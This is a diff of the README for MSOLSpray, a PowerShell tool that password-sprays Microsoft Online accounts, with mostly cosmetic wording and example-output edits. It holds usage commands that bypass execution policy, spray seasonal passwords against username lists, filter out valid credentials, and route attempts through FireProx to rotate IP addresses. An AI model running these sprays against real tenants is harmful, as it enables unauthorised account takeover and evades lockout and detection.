@@ -18,12 +18,11 @@ Lastly, this tool works well with [FireProx](https://github.com/ustayready/firep
 
 ## Quick Start
 
-Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass' or run the `Set-ExecutionPolicy` command from the example below.
+Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass' or run the `Set-ExecutionPolicy -s p -e b` command in a existing PowerShell Session.
 
 ### Test single username and password
 
 ```PowerShell
-PS C:\> Set-ExecutionPolicy -S P -e B
 PS C:\> Import-Module MSOLSpray.ps1
 PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020
 
@@ -42,8 +41,8 @@ PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,Klaas@domain.nl -Password W
 Time                Username         Password   IsValid ResponseError
 ----                --------         --------   ------- -------------
 2020-08-14 12:25:15 Steve@domain.com Winter2020 True    None.
-2020-08-14 12:25:15 Klaas@domain.com Winter2020 False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.nl  Zomer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-14 12:25:15 Klaas@domain.nl  Winter2020 False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-14 12:25:15 Steve@domain.com Zomer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
 2020-08-14 12:25:15 Klaas@domain.nl  Zomer2020  True    None.
 ```
 
@@ -79,8 +78,8 @@ Time                Username         Password    IsValid ResponseError
 ### Filter output to only show valid passwords
 
 ```PowerShell
-PS C:\> $results = Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt
-PS C:\> $results | Where-Object {$_.IsValid -eq $true} | Format-Table
+PS C:\> Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt | Where-Object {$_.IsValid -eq $true} | Format-Table
+
 Time                Username         Password    IsValid ResponseError
 ----                --------         --------    ------- -------------
 2020-08-14 12:25:15 John@domain.com  Summer2020  True    None.
@@ -100,10 +99,10 @@ Steve@domain.com : Winter2020 : None.
 ### Invoke-MSOLSpray Options
 
 ```txt
-Usernames           - Takes in a single or multiple usernames in the following format "user@domain.com". Can be combined with UsernameList.
-UsernameList        - Takes in a single or multiple UsernameList files filled with usernames. Usernames should be entered one-per-line in the following format "user@domain.com". Can be combined with Usernames.
-Passwords           - Takes in a single or multiple passwords. Can be combined with PasswordList.
-PasswordList        - Takes in a single or multiple PasswordList files with passwords. Entered one-per-line. Can be combined with Passwords.
+Usernames           - Takes in a single or multiple usernames in the following format "user@domain.com". Can be combined with UsernameList option.
+UsernameList        - Takes in a single or multiple UsernameList files filled with usernames. Usernames should be entered one-per-line in the following format "user@domain.com". Can be combined with Usernames option.
+Passwords           - Takes in a single or multiple passwords. Can be combined with PasswordList option.
+PasswordList        - Takes in a single or multiple PasswordList files with passwords. Entered one-per-line. Can be combined with Passwords option.
 URL                 - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
 Delay               - The delay used to wait between authentication attempts.
 UserAgent           - The UserAgent PowerShell will use during the logon the password spray.
